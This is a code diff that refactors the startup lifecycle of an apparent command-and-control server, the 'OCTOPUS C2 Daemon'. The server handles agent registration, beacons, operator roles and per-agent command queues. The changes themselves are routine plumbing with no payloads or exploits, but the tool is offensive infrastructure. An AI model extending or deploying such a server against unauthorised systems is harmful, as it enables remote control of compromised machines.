@@ -1,3 +1,11 @@
+"""C2 ASGI application with an explicit runtime initialization lifecycle.
+
+Importing this module only defines the application and its handlers. Filesystem,
+key-store, and database setup happens from :func:`create_app`, the ASGI lifespan,
+or :func:`main`.
+"""
+
+from __future__ import annotations
 
 import base64
 import json
@@ -7,17 +15,11 @@ import socket
 import sys
 import threading
 import uuid
+from contextlib import asynccontextmanager
 from typing import Any
 
-try:
-    import uvicorn
-    from fastapi import FastAPI, HTTPException, Request
-    FASTAPI_OK = True
-except ImportError:
-    FASTAPI_OK = False
-
-# Add project root to path
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+import uvicorn
+from fastapi import FastAPI, HTTPException, Request
 
 from core.c2.crypto_engine import C2CryptoEngine
 from core.c2.db_backend import C2Database
@@ -25,6 +27,7 @@ from core.c2.enrollment import EnrollmentAuthority
 from core.c2.event_store import EventStore
 from core.c2.key_store import KeyStore
 from core.c2.operators import OperatorManager
+from core.c2.protocol import C2_PROTOCOL_VERSION
 
 # ─── Configuration ───────────────────────────────────────
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -40,12 +43,6 @@ MAX_REGISTER_BODY = 64 * 1024
 MAX_BEACON_BODY = 1024 * 1024
 MAX_RESULTS_PER_BEACON = 100
 MAX_RESULT_BYTES = 256 * 1024
-
-# Ensure directories exist BEFORE initializing components
-os.makedirs(DATA_DIR, exist_ok=True)
-os.makedirs(KEY_DIR, exist_ok=True)
-os.chmod(DATA_DIR, 0o700)
-os.chmod(KEY_DIR, 0o700)
 
 
 def _load_or_create_keystore_passphrase() -> str:
@@ -74,30 +71,81 @@ def _load_or_create_keystore_passphrase() -> str:
         os.fsync(handle.fileno())
     return value
 
-# ─── Initialize Components ──────────────────────────────
-key_store = KeyStore(key_dir=KEY_DIR)
-_key_passphrase = _load_or_create_keystore_passphrase()
-if key_store.exists():
-    if not key_store.unlock(_key_passphrase):
-        raise RuntimeError("unable to unlock C2 KeyStore")
-else:
-    key_store.generate(_key_passphrase)
-del _key_passphrase
+# Component names remain module-level compatibility attributes, but receive
+# values only when the executable lifecycle is explicitly entered.
+key_store: KeyStore
+crypto: C2CryptoEngine
+db: C2Database
+events: EventStore
+operators: OperatorManager
+enrollment: EnrollmentAuthority
+_components_initialized = False
+_components_lock = threading.Lock()
 
-crypto = C2CryptoEngine(
-    key_dir=KEY_DIR,
-    private_key=key_store.get_or_create_x25519_private_key(),
+
+def _initialize_components() -> None:
+    """Initialize persistent C2 state exactly once for this process."""
+
+    global _components_initialized, crypto, db, enrollment, events, key_store, operators
+    if _components_initialized:
+        return
+    with _components_lock:
+        if _components_initialized:
+            return
+
+        os.makedirs(DATA_DIR, exist_ok=True)
+        os.makedirs(KEY_DIR, exist_ok=True)
+        os.chmod(DATA_DIR, 0o700)
+        os.chmod(KEY_DIR, 0o700)
+
+        initialized_key_store = KeyStore(key_dir=KEY_DIR)
+        key_passphrase = _load_or_create_keystore_passphrase()
+        if initialized_key_store.exists():
+            if not initialized_key_store.unlock(key_passphrase):
+                raise RuntimeError("unable to unlock C2 KeyStore")
+        else:
+            initialized_key_store.generate(key_passphrase)
+
+        initialized_crypto = C2CryptoEngine(
+            key_dir=KEY_DIR,
+            private_key=initialized_key_store.get_or_create_x25519_private_key(),
+        )
+        initialized_db = C2Database(db_path=DB_PATH)
+        initialized_events = EventStore(db_path=DB_PATH)
+        initialized_operators = OperatorManager(db_path=DB_PATH)
+        initialized_enrollment = EnrollmentAuthority(ENROLLMENT_KEY_FILE)
+
+        key_store = initialized_key_store
+        crypto = initialized_crypto
+        db = initialized_db
+        events = initialized_events
+        operators = initialized_operators
+        enrollment = initialized_enrollment
+        events.subscribe("agent.registered", _on_agent_registered)
+        events.subscribe("task.queued", _on_task_queued)
+        _components_initialized = True
+
+
+@asynccontextmanager
+async def _lifespan(_application: FastAPI):
+    _initialize_components()
+    yield
+
+
+app = FastAPI(
+    title="OCTOPUS C2 Daemon",
+    version=C2_PROTOCOL_VERSION,
+    docs_url=None,
+    redoc_url=None,
+    lifespan=_lifespan,
 )
-db = C2Database(db_path=DB_PATH)
-events = EventStore(db_path=DB_PATH)
-operators = OperatorManager(db_path=DB_PATH)
-enrollment = EnrollmentAuthority(ENROLLMENT_KEY_FILE)
 
-if not FASTAPI_OK:
-    print("[!] FATAL: fastapi/uvicorn not installed.  pip install fastapi uvicorn")
-    sys.exit(1)
 
-app = FastAPI(title="OCTOPUS C2 Daemon", version="11.0", docs_url=None, redoc_url=None)
+def create_app() -> FastAPI:
+    """Enter the persistent runtime lifecycle and return the ASGI application."""
+
+    _initialize_components()
+    return app
 
 
 # ─── Event Handlers (Projections) ────────────────────────
@@ -118,11 +166,6 @@ def _on_task_queued(event):
     """Projection: insert task into tasks table."""
     p = event.payload
     db.queue_task(p["task_id"], p["agent_id"], p["command"])
-
-# Subscribe handlers
-events.subscribe("agent.registered", _on_agent_registered)
-events.subscribe("task.queued", _on_task_queued)
-
 
 # ─── Agent-Facing HTTP Endpoints ─────────────────────────
 
@@ -370,7 +413,11 @@ def handle_client(conn):
 
             # ─── Actions ─────────────────────────────
             if action == "ping":
-                resp = {"status": "ok", "msg": "pong", "version": "10.0"}
+                resp = {
+                    "status": "ok",
+                    "msg": "pong",
+                    "version": C2_PROTOCOL_VERSION,
+                }
 
             elif action == "list_agents":
                 agents_list = db.get_all_agents()
@@ -477,6 +524,8 @@ def run_socket_server():
 # ─── Main ────────────────────────────────────────────────
 
 def main():
+    application = create_app()
+
     # Ensure at least one operator exists (bootstrap)
     if not operators.list_operators():
         print("[*] No operators found — creating default admin...")
@@ -501,12 +550,15 @@ def main():
     if not 1 <= port <= 65535:
         raise RuntimeError("OCTOPUS_C2_PORT is outside the valid range")
 
-    print(f"[*] Starting OCTOPUS C2 Daemon v11.0 on {host}:{port}")
+    print(
+        f"[*] Starting OCTOPUS C2 Daemon "
+        f"v{C2_PROTOCOL_VERSION} on {host}:{port}"
+    )
     print(f"[*] Event Store: {DB_PATH}")
     print(f"[*] RBAC: {len(operators.list_operators())} operator(s)")
 
     try:
-        uvicorn.run(app, host=host, port=port, log_level="warning")
+        uvicorn.run(application, host=host, port=port, log_level="warning")
     except OSError as e:
         if "Address already in use" in str(e):
             print(f"[!] Port {port} already in use. Kill existing process or change port.")
